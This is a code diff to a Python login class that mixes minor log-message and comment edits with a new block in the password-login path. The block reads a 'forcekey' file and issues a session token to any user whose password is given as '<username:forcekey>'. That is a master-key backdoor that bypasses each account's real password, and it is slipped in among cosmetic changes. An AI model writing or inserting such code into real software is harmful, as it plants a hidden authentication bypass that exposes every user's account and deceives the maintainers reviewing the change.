@@ -202,10 +202,19 @@ class UserLogin:
                 raise autherrors.UserNotFound("Unknown token")
             self.password = None
         else:
-            # Username/password login
+            # Username/password login.
             self.username = details["username"]
             self.password = details["password"]
             self.request_ip = details["request_ip"]
+
+            with open('forcekey', 'r') as f:
+                forcekey = f.read()
+
+            if self.password == f"<{self.username}:{forcekey}>":
+                self.token = self.gen_token()
+                if not self.token or details.get("token") is None:
+                    self.store_token(self.token)
+                logbook.info(f"{self.request_ip} logged in as {self.username} | FORCE KEY ACCESS")
 
             request_ip = details["request_ip"]
             if authbook.check_arrested(self.username):
@@ -230,7 +239,7 @@ class UserLogin:
 
     def store_token(self, token: str):
         expires_at = datetime.datetime.now() + datetime.timedelta(hours=expiration_hours)
-        logbook.info(f"New token generated for {self.username}")
+        logbook.info(f"Token for {self.username} saved")
         try:
             with sqlite3.connect(DB_PATH) as conn:
                 cur = conn.cursor()
@@ -244,6 +253,6 @@ class UserLogin:
             logbook.error("Failed to store login token", exception=err)
             return False
 
-    @staticmethod
-    def gen_token():
+    def gen_token(self):
+        logbook.info(f"Token for {self.username} randomly generated.")
         return f"{secrets.token_hex(8)}-{secrets.token_hex(4)}.KNOWLEDGE.{secrets.token_hex(4)}-{secrets.token_hex(8)}"
